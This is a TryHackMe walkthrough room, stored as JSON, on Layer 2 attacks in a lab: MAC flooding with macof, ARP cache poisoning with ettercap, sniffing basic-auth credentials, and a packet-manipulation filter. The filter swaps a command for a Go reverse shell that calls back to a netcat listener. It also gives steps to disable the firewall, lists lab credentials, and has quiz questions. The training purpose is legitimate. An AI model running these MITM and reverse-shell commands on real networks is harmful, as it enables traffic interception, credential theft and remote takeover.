{'image': 'https://tryhackme-images.s3.amazonaws.com/room-icons/eef593f2e4745dcb78b16698115f2561.jpeg', 'title': 'L2 MAC Flooding & ARP Spoofing', 'description': 'Learn how to use MAC Flooding to sniff traffic and ARP Cache Poisoning to manipulate network traffic as a MITM.', 'code': 'layer2', 'users': 5451, 'tags': ['layer2', 'spoofing', 'arp', 'ettercap', 'macof', 'security', 'l2', 'mac', 'mitm', 'maninthemiddle', 'physical', 'gns3', 'flooding', 'network', 'networking'], 'type': 'walkthrough', 'difficulty': 'easy', 'userCompleted': False, 'upVotes': 278, 'created': '2022-02-24T01:06:06.069Z', 'published': '2022-04-27T18:00:00.271Z', 'freeToUse': True, 'businessOnly': False, 'headerImage': 'https://cdn.pixabay.com/photo/2018/08/26/18/45/server-3632935_960_720.jpg', 'creator': 'TobjasR', 'tasks': [{'taskTitle': 'Getting Started', 'taskDesc': '<p><span style="font-size:1rem">While it\'s not required, ideally, you should have a general understanding of OSI Model </span><a href="https://en.wikipedia.org/wiki/Data_link_layer" target="_blank">Layer 2</a><span style="font-size:1rem"> (L2) </span><a href="https://en.wikipedia.org/wiki/Network_switch" target="_blank">network switches</a><span style="font-size:1rem"> work, what a </span><a href="https://en.wikipedia.org/wiki/MAC_table" target="_blank">MAC table</a><span style="font-size:1rem"> is, what the Address Resolution Protocol (<a href="https://en.wikipedia.org/wiki/Address_Resolution_Protocol" target="_blank">ARP</a>) does, and how to use Wireshark at a basic level.\xa0</span><span style="font-size:1rem">If you\'re not comfortable with these topics, please check out the</span><span style="font-size:1rem">\xa0</span><a href="https://tryhackme.com/module/network-fundamentals" target="_blank">Network</a><span style="font-size:1rem">\xa0</span><span style="font-size:1rem">and</span><span style="font-size:1rem">\xa0</span><a href="https://tryhackme.com/module/linux-fundamentals" target="_blank">Linux</a><span style="font-size:1rem">\xa0</span><span style="font-size:1rem">Fundamentals modules and</span><span style="font-size:1rem">\xa0</span><a href="https://tryhackme.com/room/wireshark" target="_blank">Wireshark</a><span style="font-size:1rem">\xa0</span><span style="font-size:1rem">room.</span></p><p>Now that we\'ve covered the prerequisites go ahead and start the machine and let\'s get started!</p><p><i>Please, allow a minimum of <span style="background-color:transparent"><b>5 minutes</b> </span>for the machine(s) to get the services fully up and running, before connecting via SSH.</i></p>', 'taskType': 'vm', 'taskNo': 1, 'taskCreated': '2022-02-24T01:21:35.499Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '6224ae6889c58e00490e1c91', 'questions': [{'questionNo': 1, 'question': '<p><span style="font-size:1rem">I understand and have started t</span>he machine by pressing the Start Machine button.<br /></p>', 'hint': ''}]}, {'taskTitle': 'Initial Access', 'taskDesc': '<p></p><p><i>For the sake of this room, let\'s assume the following:</i></p><p>While conducting a pentest, you have gained initial access to a network and escalated privileges to root  on a Linux machine. During your routine OS enumeration, you realize it\'s a <a href="https://en.wikipedia.org/wiki/Dual-homed" target="_blank">dual-homed</a> host, meaning it is connected to two (or more) networks. Being the curious hacker you are, you decided to explore this network to see if you can move laterally.</p><p>After having established <b>persistence</b>, you can access the compromised host via <b>SSH</b>:</p><table class="table table-bordered"><tbody><tr><td><b>User</b></td><td><b>Password</b></td><td><b>IP</b></td><td><b>Port</b></td></tr><tr><td><span style="font-family:&quot;Courier New&quot;">admin</span></td><td><span style="font-family:&quot;Courier New&quot;">Layer2</span></td><td><span style="font-family:&quot;Courier New&quot;">MACHINE_IP</span></td><td><span style="font-family:&quot;Courier New&quot;">22</span></td></tr></tbody></table><i>Please, allow a minimum of <span style="background-color:transparent"><b>5 minutes</b> </span>for the machine to get the services fully up and running, <b>then</b> try connecting with SSH (if you login, and the command line isn\'t showing up yet, <b>don\'t hit Ctrl+C! </b>Just be patientâ€¦):</i><p></p><p></p><p><code>ssh -o StrictHostKeyChecking=accept-new admin@MACHINE_IP</code></p><p>Note: The\xa0<b><span style="font-family:&quot;Courier New&quot;">admin</span></b>\xa0user is in the <b><span style="font-family:&quot;Courier New&quot;">sudo</span></b> group. I suggest using the\xa0<b><span style="font-family:&quot;Courier New&quot;">root</span></b> user to complete this room<span style="font-size:1rem">: </span><code>sudo su -</code></p><p></p><p></p><p></p>', 'taskType': 'none', 'taskNo': 2, 'taskCreated': '2022-02-24T01:31:07.409Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Now, can you (re)gain access? (Yay/Nay)<br />', 'hint': 'After 5-8 minutes you should be able to SSH into the machine with the credentials above.'}]}, {'taskTitle': 'Network Discovery', 'taskDesc': '<p>As mentioned previously, the host is connected to one or more additional networks.\xa0<span style="font-size:1rem">You are currently connected to the machine via SSH on Ethernet adapter </span><b style="font-size:1rem"><span style="font-family:&quot;Courier New&quot;">eth0</span></b><span style="font-size:1rem">.\xa0</span><span style="font-size:1rem">The network of interest is connected with Ethernet adapter </span><b style="font-size:1rem"><span style="font-family:&quot;Courier New&quot;">eth1</span></b><span style="font-size:1rem">.</span></p><p>First, have a look at the adapter:<br /></p><p><code>ip address show eth1</code><span style="font-size:1rem"> or the shorthand version:\xa0</span><code>ip a s eth1</code><span style="background-color:rgb(234, 234, 237);color:rgb(196, 20, 20);font-family:SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px"></span></p><p>Using this knowledge, answer questions <b>#1</b> and <b>#2</b>.</p><p>Now, use the network enumeration tool of your choice, e.g.,\xa0<b><span style="font-family:&quot;Courier New&quot;">ping</span></b>, a\xa0bash or python script, or Nmap (pre-installed) to discover other hosts in the network and answer question <b>#3</b>.<br /></p>', 'taskType': 'none', 'taskNo': 3, 'taskCreated': '2022-02-24T02:07:17.923Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'What is your IP address?<br />', 'hint': ''}, {'questionNo': 2, 'question': "<p>What's the network's CIDR prefix?<br /></p>", 'hint': 'Prefix format: /??'}, {'questionNo': 3, 'question': '<p>How many other live hosts are there?<br /></p>', 'hint': ''}, {'questionNo': 4, 'question': "<p>What's the hostname of the first host (lowest IP address) you've found?<br /></p>", 'hint': 'Use Nmap or take a look at a particular file that maps IPs to hostnames.'}]}, {'taskTitle': 'Passive Network Sniffing', 'taskDesc': '<p>Simply scanning those hosts won\'t help us gather any useful information, and you may be asking,\xa0<span style="font-size:1rem">what could a pentester do in this situation? Depending on the </span><b style="font-size:1rem">rules of engagement</b><span style="font-size:1rem">\xa0and </span><b style="font-size:1rem">scope</b><span style="font-size:1rem">, you could try </span><b style="font-size:1rem">sniffing</b><span style="font-size:1rem"> traffic on this network.</span></p><p>The diagram below describes your current situation where you are the <b><span style="font-family:&quot;Courier New&quot;">Attacker</span></b> and have persistent access to <b><span style="font-family:&quot;Courier New&quot;">eve.</span></b></p><p></p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5e9955140ab79a04b28162eb/room-content/f19dfb6c3e6771ba582f1994ca54648a.png" /><br /></p><p>Let\'s try running <b><span style="font-family:&quot;Courier New&quot;">tcpdump</span></b> on the <b><span style="font-family:&quot;Courier New&quot;">eth1</span></b><span style="font-size:1rem"> network interface</span><span style="font-size:1rem">:</span></p><p><code>tcpdump -i eth1</code></p><p>Optionally, for a more verbose output that prints each packet (minus its link level header) in ASCII format:</p><p><code>tcpdump -A -i eth1<br /></code></p><p>Try to answer questions <b>#1</b> through <b>#2</b>.<br /></p><p>Now, let\'s take a closer look at the captured packets!\xa0<span style="font-size:1rem">We can redirect them into a </span><b style="font-size:1rem"><span style="font-family:&quot;Courier New&quot;">pcap</span></b><span style="font-size:1rem"> file providing a destination file via the </span><b style="font-size:1rem"><span style="font-family:&quot;Courier New&quot;">-w</span></b><span style="font-size:1rem"> argument</span><span style="font-size:1rem">:</span></p><p><span style="font-size:1rem"></span></p><p><code>tcpdump -A -i eth1 -w /tmp/tcpdump.pcap</code></p><p><span style="font-size:1rem">Capture traffic for about a minute, then transfer the\xa0</span><span style="font-weight:bolder;font-size:1rem"><span style="font-family:&quot;Courier New&quot;">pcap</span></span><span style="font-size:1rem">\xa0to either you</span><span style="font-size:1rem">r machine or the AttackBox to open it in Wireshark.</span></p><p><span style="font-size:1rem">Example to transfer the packet capture using <b><span style="font-family:&quot;Courier New&quot;">scp</span></b> </span><span style="font-size:1rem">and open it in Wireshark:</span></p><p><code>scp admin@MACHINE_IP:/tmp/tcpdump.pcap .<br />wireshark tcpdump.pcap<br /></code></p><p>Now, you should be able to answer questions <b>#3 </b>and<b> #4</b>.</p><p>Note: If you receive an error "tcpdump: /tmp/tcpdump.pcap: Permission denied" and cannot overwrite the existing <b><span style="font-family:&quot;Courier New&quot;">/tmp/tcpdump.pcap</span></b> file, specify a new filename such as <span style="font-family:&quot;Courier New&quot;">tcpdump</span><b>2</b><span style="font-family:&quot;Courier New&quot;">.pcap</span>,\xa0or run <code>rm -f /tmp/*.pcap</code><span style="font-size:1rem">\xa0then re-run</span> <b><span style="font-family:&quot;Courier New&quot;">tcpdump</span></b>.<br /></p>', 'taskType': 'none', 'taskNo': 4, 'taskCreated': '2022-02-24T02:38:26.478Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Can you see any traffic from those hosts? (Yay/Nay)<br />', 'hint': ''}, {'questionNo': 2, 'question': '<p>Who keeps sending packets to eve?<br /></p>', 'hint': ''}, {'questionNo': 3, 'question': '<p>What type of packets are sent?<br /></p>', 'hint': "It's a layer 3 protocol"}, {'questionNo': 4, 'question': "<p>What's the size of their data section? (bytes)<br /></p>", 'hint': '"Data (*** bytes)"'}]}, {'taskTitle': 'Sniffing while MAC Flooding', 'taskDesc': '<p>Unfortunately, we weren\'t able to capture any interesting traffic so far. However, we\'re not going to give up this easily! So, how can we capture more network traffic?\xa0<span style="font-size:1rem">As mentioned in the room description, we could try to launch a </span><a href="https://en.wikipedia.org/wiki/MAC_flooding" target="_blank">MAC flooding</a><span style="font-size:1rem">\n attack against the L2-Switch.</span></p><p><b>Beware:</b> MAC flooding could trigger an alarm in a SOC. No, seriously, suspicious \nlayer 2 traffic can easily be detected and reported by state-of-the-art \nand properly configured network devices. Even worse, your network \nport could even get blocked by the network device altogether, rendering your machine locked out of the network. In case of production services running on or production traffic being routed through that network connection, this could even result in an effective <b>Denial-of-Service</b>!</p><p> However, if we\'re successful, the switch \nwill resort to fail-open mode and temporarily operate similarly to a network hub â€“ forwarding all received frames to every connected port (aside from the port the traffic originated from). This would allow an adversary or pentester to sniff the network traffic between other hosts that normally wouldn\'t be received by their device if the switch were functioning properly.<br /></p><p>Considering such an attack vector is only recommended when you have reasons to believe thatâ€¦</p><ul><li>It is in fact a switched network (and not a virtual bridge) <b>AND</b><br /></li><li>The switch might be a consumer or prosumer (unmanaged) switch <b>OR </b>the network admins\n haven\'t configured mitigations such as Dynamic ARP Inspection (DAI) for instance\xa0<b>AND</b></li><li>ARP and MAC spoofing attacks are explicitly permitted in the\xa0<b>rules of engagement</b>. When in doubt, clarify with your client first!<br /></li></ul><p><i>Anyhow, let\'s assume you\'ve met the\nwell-thought decision to give it a try.</i></p><p>For better usability, open a second SSH session. This way, you can leave the <b><span style="font-family:&quot;Courier New&quot;">tcpdump</span></b> process running in the foreground on the first SSH session:</p><p><code>tcpdump -A -i eth1 -w /tmp/tcpdump2.pcap</code></p><p>Now, on the second SSH session, buckle up and let <b><span style="font-family:&quot;Courier New&quot;"><a href="http://manpages.ubuntu.com/manpages/bionic/man8/macof.8.html" target="_blank">macof</a></span></b> run against the interface to start flooding the switch:<br /></p><p><code>macof -i eth1</code></p><p>After around 30 seconds, stop both <b><span style="font-family:&quot;Courier New&quot;">macof</span></b> and <b><span style="font-family:&quot;Courier New&quot;">tcpdump</span></b> <span style="font-family:&quot;Courier New&quot;">(Ctrl+C)</span>.</p><p>As in the previous task, <span style="font-size:1rem">transfer the <b><span style="font-family:&quot;Courier New&quot;">pcap</span></b> to your machine (</span><span style="font-size:1rem"><span style="font-size:1rem"><b><span style="font-family:&quot;Courier New&quot;">kali/AttackBox)</span></b></span> and take a look</span><span style="font-size:1rem">:</span></p><p><code>scp admin@MACHINE_IP:/tmp/tcpdump2.pcap .<br />wireshark tcpdump2.pcap<br /></code></p><p>Now, you should be able to answer questions <b>#1</b> and <b>#2</b>.</p><p><b>Note:</b> If it didn\'t work, try to capture for 30 seconds, again (while <b><span style="font-family:&quot;Courier New&quot;">macof</span></b> is running).<br />If it still won\'t work, give it one last try with a capture duration of one minute.<br />As the measure of last resort, try using\xa0<b><span style="font-family:&quot;Courier New&quot;"><a href="https://www.kali.org/tools/ettercap/" target="_blank">ettercap</a></span></b> (introduced in the following tasks) with the\xa0<b><span style="font-family:&quot;Courier New&quot;">rand_flood</span></b> plugin:</p><p><code>ettercap -T -i eth1 -P rand_flood -q -w /tmp/tcpdump3.pcap</code><span style="font-size:1rem"> (Quit with </span><b style="font-size:1rem"><span style="font-family:&quot;Courier New&quot;">q</span></b><span style="font-size:1rem">)</span></p>', 'taskType': 'none', 'taskNo': 5, 'taskCreated': '2022-03-06T17:23:18.817Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p>What kind of packets is Alice continuously sending to Bob?\xa0 <br /></p>', 'hint': 'Which layer 3 protocol?'}, {'questionNo': 2, 'question': "<p>What's the size of their data section? (bytes)</p>", 'hint': '"Data (**** bytes)"'}]}, {'taskTitle': 'Man-in-the-Middle: Intro to ARP Spoofing', 'taskDesc': '<p>As you may have noticed, <span style="font-size:1rem">MAC Flooding can be considered a real "noisy" technique. In order to reduce the risk of detection and \nDoS we will leave </span><b style="font-size:1rem"><span style="font-family:&quot;Courier New&quot;">macof</span></b> aside for now. Instead, we are going to perform so-called <b>ARP cache poisoning</b> <span style="font-size:1rem">attacks</span><span style="font-size:1rem"> against Alice and Bob, </span><span style="font-size:1rem">in an attempt to become a fully-fledged <a href="https://en.wikipedia.org/wiki/Man-in-the-middle_attack" target="_blank">Man-in-the-Middle</a> (MITM). </span></p><p>For a deeper understanding of this technique, read the Wikipedia article on <a href="https://en.wikipedia.org/wiki/ARP_spoofing" target="_blank">ARP spoofing</a>.<span style="font-size:1rem"></span></p><p><span style="font-size:1rem"><i><b>tl;dr â€“ </b>"an attacker sends (spoofed) ARP messages [â€¦] to associate the attacker\'s MAC address with the IP address of another host [â€¦] causing any traffic meant for that IP address to be sent to the attacker instead. ARP spoofing may allow an attacker to <b>intercept</b> data frames on a network, <b>modify</b> the traffic, or stop all traffic. Often the attack is used as an opening for other attacks, such as denial of service, <b>man in the middle</b>, or session hijacking attacks."\xa0</i></span><i>-\xa0</i><a href="https://en.wikipedia.org/wiki/ARP_spoofing" target="_blank"><i>Wikipedia - ARP spoofing</i></a></p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5e9955140ab79a04b28162eb/room-content/53adfdaeec3bdfa65af7b1342cc77c2c.png" /><span style="font-size:1rem"><br /></span></p><p><i><a href="https://commons.wikimedia.org/wiki/File:ARP_Spoofing.svg" target="_blank">https://commons.wikimedia.org/wiki/File:ARP_Spfing.svg</a></i><span style="font-size:1rem"><br /></span></p><p>There are, however, measures and controls available to detect and prevent such attacks. In the current scenario, both hosts are running an ARP implementation that takes pains to validate incoming ARP replies. Without further ado, we are using <b style="font-size:1rem"><span style="font-family:&quot;Courier New&quot;">ettercap</span></b><span style="font-size:1rem"> to launch an ARP Spoofing attack against Alice and Bob and see how they react:</span></p><p><code>ettercap -T -i eth1 -M arp</code><br /></p>', 'taskType': 'none', 'taskNo': 6, 'taskCreated': '2022-02-24T03:30:52.994Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Can ettercap establish a MITM in between Alice and Bob? (Yay/Nay)<br />', 'hint': ''}, {'questionNo': 2, 'question': '<p>Would you expect a different result when attacking hosts without ARP packet validation enabled? (Yay/Nay)</p>', 'hint': ''}]}, {'taskTitle': 'Man-in-the-Middle: Sniffing', 'taskDesc': '<p> In this somewhat altered scenario, Alice and Bob are running a different OS (Ubuntu) with its default ARP implementation and no <span style="font-size:1rem"><span style="font-size:1rem"><span style="font-size:1rem">protective controls </span></span></span>on their machines. As in the previous task, try to establish a MITM using <b style="font-size:1rem"><span style="font-family:&quot;Courier New&quot;">ettercap</span></b><span style="font-size:1rem">\xa0and see if Ubuntu </span><span style="font-size:1rem"><span style="font-size:1rem"><span style="font-size:1rem">(by default) </span></span>is falling prey to it</span><span style="font-size:1rem">.</span></p><p>After starting the VM attached to this task, you can log on via SSH with the same credentials as before:</p><p>Username: <b>admin</b><br />Password: <b>Layer2</b></p><p><i>As with the previous machine, please, also allow a minimum of <span style="background-color:transparent"><b>5 minutes</b> </span>for this box to spin up, <b>then</b> try connecting with SSH (if you login, and the command line isn\'t showing up yet, <b>don\'t hit Ctrl+C! </b>Just be patientâ€¦)</i></p>', 'taskType': 'vm', 'taskNo': 7, 'taskCreated': '2022-03-27T19:35:13.042Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '625f36c615f6c7004a31a1ea', 'questions': [{'questionNo': 1, 'question': "Scan the network on eth1. Who's there? Enter their IP addresses in ascending order.<br />", 'hint': ''}, {'questionNo': 2, 'question': '<p>Which machine has an open well-known port?<br /></p>', 'hint': ''}, {'questionNo': 3, 'question': '<p>What is the port number?<br /></p>', 'hint': ''}, {'questionNo': 4, 'question': '<p>Can you access the content behind the service from your current position? (Nay/Yay)</p>', 'hint': ''}, {'questionNo': 5, 'question': '<p>Can you see any meaningful traffic to or from that port passively sniffing on you interface eth1? (Nay/Yay)<br /></p>', 'hint': 'tcpdump -vvA -i  eth1'}, {'questionNo': 6, 'question': '<p>Now launch the same ARP spoofing attack as in the previous task. Can you see some interesting traffic, now? (Nay/Yay)</p>', 'hint': 'ettercap -T -i eth1 -M arp'}, {'questionNo': 7, 'question': '<p>Who is using that service?<br /></p>', 'hint': 'hostname'}, {'questionNo': 8, 'question': "<p>What's the hostname the requests are sent to?<br /></p>", 'hint': ''}, {'questionNo': 9, 'question': '<p>Which file is being requested?<br /></p>', 'hint': ''}, {'questionNo': 10, 'question': '<p>What text is in the file?<br /></p>', 'hint': 'Just two letters'}, {'questionNo': 11, 'question': 'Which credentials are being used for authentication? (username:password)<br />', 'hint': 'the basic auth authorization "key" is just a base64 encoded credential pair'}, {'questionNo': 12, 'question': '<p>Now, stop the attack (by pressing q). What is ettercap doing in order to leave its man-in-the-middle position gracefully and undo the poisoning?<br /></p>', 'hint': 'The second-last line displayed after pressing q (without the "...")'}, {'questionNo': 13, 'question': '<p>Can you access the content behind that service, now, using the obtained credentials? (Nay/Yay)<br /></p>', 'hint': 'curl -u user:pass http://ip/'}, {'questionNo': 14, 'question': '<p>What is the user.txt flag?<br /></p>', 'hint': ''}, {'questionNo': 15, 'question': '<p>You should also have seen some\xa0 rather questionable kind of traffic. What kind of remote access (shell) does Alice have on the server?<br /></p>', 'hint': 'The type of connection you want to catch when compromising hosts allowing you to execute commands by calling back to your listener.'}, {'questionNo': 16, 'question': '<p>What commands are being executed? Answer in the order they are being executed.<br /></p>', 'hint': ''}, {'questionNo': 17, 'question': 'Which of the listed files do you want?<br />', 'hint': 'Which of the listed files most likely contains the flag? (Just the file name.)'}]}, {'taskTitle': 'Man-in-the-Middle: Manipulation', 'taskDesc': '<p></p><p><span style="font-size:1rem">As a pentester, your first approach would be to try to hack Bob\'s web server. For the purpose of this room, let\'s assume it\'s impossible. Also, capturing basic auth credentials won\'t help for password reuse or similar attacks.</span><br /></p><p>So, let\'s advance our ongoing ARP poisoning attack into a fully-fledged MITM that includes packet manipulation! As Alice\'s packets pass through your attacker machine (<b><span style="font-family:&quot;Courier New&quot;">eve</span></b>), we can tamper with them. </p><p>How can we go about doing this? Ettercap comes with an <code>-F</code> option that allows you to apply filters in the form of specified <b><span style="font-family:&quot;Courier New&quot;">etterfilter.ef</span></b> files for the session. These <b><span style="font-family:&quot;Courier New&quot;">.ef</span></b> files, however, have to be compiled from <span style="font-family:&quot;Courier New&quot;"><b>etterfilter</b></span> source filter files (<b><span style="font-family:&quot;Courier New&quot;">.ecf</span></b>) first. Their source code syntax is similar to C code.\xa0<span style="font-size:1rem">To keep this task more beginner-friendly, we assume it won\'t matter if Alice detects our manipulation activities. For the sake of this room, we are only going to manipulate her commands and won\'t be taking any OPSEC precautions.</span></p><p><span style="font-size:1rem">Which brave command of hers should volunteer for our audacious endeavor? How aboutâ€¦ yes,</span><span style="font-size:1rem">\xa0</span><span style="font-size:1rem;font-weight:bolder"><span style="font-family:&quot;Courier New&quot;">whoami,</span></span><span style="font-size:1rem">\xa0</span><span style="font-size:1rem">of course!</span></p><p><span style="font-size:1rem">Before you copy and paste the filter below, it\'s best to understand the </span><b style="font-size:1rem"><span style="font-family:&quot;Courier New&quot;">etterfilter</span></b><span style="font-size:1rem"> command and its source file syntax. Consult the man page by either running\xa0 </span><code>man etterfilter</code><span style="font-size:1rem">\xa0or browsing the </span><a href="https://linux.die.net/man/8/etterfilter" target="_blank">linux.die.net/man/8/etterfilter</a> page.<br /></p><p>Now, create a new etterfilter code file named <b><span style="font-family:&quot;Courier New&quot;">whoami.ecf</span></b> and try to write a filter matching Alice\'s source port and transport protocol as well as replacing <span style="font-family:&quot;Courier New&quot;"><b>whoami</b></span> data with a reverse shell payload of your choice. To see the solution, click the dropdown arrow:</p><details><summary><i>Show possible solution (spoiler!)</i></summary><br /><p>In the end, your filter might look similar to this one, where <b><span style="font-family:&quot;Courier New&quot;">&lt;reverse_shell&gt;</span></b>\xa0contains the reverse shell payload you chose:<br /></p><p><code>if (ip.proto == TCP &amp;&amp; tcp.src == 4444 &amp;&amp; search(DATA.data, "whoami") ) {<br />\xa0\xa0\xa0 log(DATA.data, "/root/ettercap.log");<br />\xa0\xa0\xa0 replace("whoami", "&lt;reverse_shell&gt;" );<br />\xa0\xa0\xa0 msg("###### ETTERFILTER: substituted \'whoami\' with reverse shell. ######\\n");<br />}</code></p></details><br /><b>Note:</b> Quotation marks need to be <b><a href="https://linux.die.net/abs-guide/escapingsection.html" target="_blank">escaped</a></b>. So, in case you want your filter to <b><span style="font-family:&quot;Courier New&quot;">replace</span></b> e.g. <code>whoami</code> with <code>echo -e "whoami\\nroot"</code>, then the quotation marks around <code>whoami\\nroot</code> would have to be escaped like this: <code>replace("whoami", "echo -e \\"whoami\\nroot\\" " )</code><p></p><p>To see a solution for the reverse shell payload, click the dropdown arrow:</p><p></p><details><summary><i>Show possible solution (spoiler!)</i></summary><p><br />The following is an example reverse shell in Golang with quotation marks already escaped: </p><p><code>echo \'package main;import\\"os/exec\\";import\\"net\\";func main(){c,_:=net.Dial(\\"tcp\\",\\"192.168.12.66:6666\\");cmd:=exec.Command(\\"/bin/sh\\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' &gt; /tmp/t.go &amp;&amp; go run /tmp/t.go &amp;</code><br /></p></details><br /><p>Finally, we need to compile the<b><span style="font-family:&quot;Courier New&quot;">.ecf</span></b> into an\xa0<b><span style="font-family:&quot;Courier New&quot;">.ef </span></b>file:</p><p><code>etterfilter whoami.ecf -o whoami.ef</code><br /></p><p>Don\'t forget to start your listener (backgrounded). For the upper example above, you could use:<br /></p><p><code>nc -nvlp 6666 &amp;</code><br /></p><p>Not so fast! If anything, we still need to allow the incoming connection through the firewall. Disable <b><span style="font-family:&quot;Courier New&quot;">ufw</span></b> or create a corresponding <b><span style="font-family:&quot;Courier New&quot;">allow</span></b> rule; otherwise, Bob\'s reverse shell will be blocked by the firewall:</p><p><code>ufw allow in on eth1 from 192.168.12.20 to 192.168.12.66 port 6666 proto tcp</code> or completely disable the firewall by running\xa0<code>ufw disable</code> </p><p>Now, run <span style="font-family:&quot;Courier New&quot;"><b>ettercap</b></span> specifying your newly created <span style="font-family:&quot;Courier New&quot;"><b>etterfilter</b></span> file:</p><p> <code>ettercap -T -i eth1 -M arp -F whoami.ef</code><br /></p><p>A few seconds after executing this command, you should see the <i>"###### ETTERFILTER: â€¦"</i> message and/or <i>"Connection received on 192.168.12.20 â€¦"</i>\xa0 in your Netcat output, which means you\'ve just caught a reverse shell from Bob! Now, you can quit <span style="font-family:&quot;Courier New&quot;"><b>ettercap</b></span> (with <b><span style="font-family:&quot;Courier New&quot;">q</span></b>), foreground your Netcat listener (with <b><span style="font-family:&quot;Courier New&quot;">fg</span></b>), and enjoy your shell!</p><p><b>Note:</b> To restrict ettercap\'s ARP poisoning efforts to your\nactual targets and only display traffic between them, you can specify them as target groups 1 and 2 by using "///"-token annotation after \nthe <b><span style="font-family:&quot;Courier New&quot;">-M arp</span></b> option: </p><p><code>ettercap -T -i eth1 -M arp /192.168.12.10// /192.168.12.20// -F whoami.ef</code></p><p></p><b>Hint:</b> In case the reverse shell won\'t work, try replacing <b><span style="font-family:&quot;Courier New&quot;">whoami</span></b> with a suitable <b><span style="font-family:&quot;Courier New&quot;">cat</span></b> command to get the flag.<br /><p></p>', 'taskType': 'none', 'taskNo': 8, 'taskCreated': '2022-04-04T14:31:16.903Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'What is the root.txt flag?', 'hint': ''}]}, {'taskTitle': 'Conclusion', 'taskDesc': '<p>I hope this room offered a new perspective for network pentesting and gave you a new <i>layer</i>\xa0of attacks for your toolbelt, and hopefully, you\'ve had some fun along the way, too!</p><p>It was also meant as an inspiration for the community to create more L2 content and learning resources, so feel free to take a look at Eve\'s L2 virtualization "backend" (<a href="https://gns3.com/software/video" target="_blank">GNS3</a>): <br /><a href="http://MACHINE_IP:3080/static/web-ui/server/2/project/cd41dfbe-4158-4ae0-b199-14cd19a36df8" target="_blank">http://MACHINE_IP:3080</a><br /></p> Please, don\'t hesitate to provide <a href="https://linkedin.com/in/tobjasr/" target="_blank">me</a> any\xa0feedback or questions on implementing GNS3 boxes, and stay tuned for some more L2 action!', 'taskType': 'none', 'taskNo': 9, 'taskCreated': '2022-03-27T19:38:06.672Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Read the above.', 'hint': ''}]}]}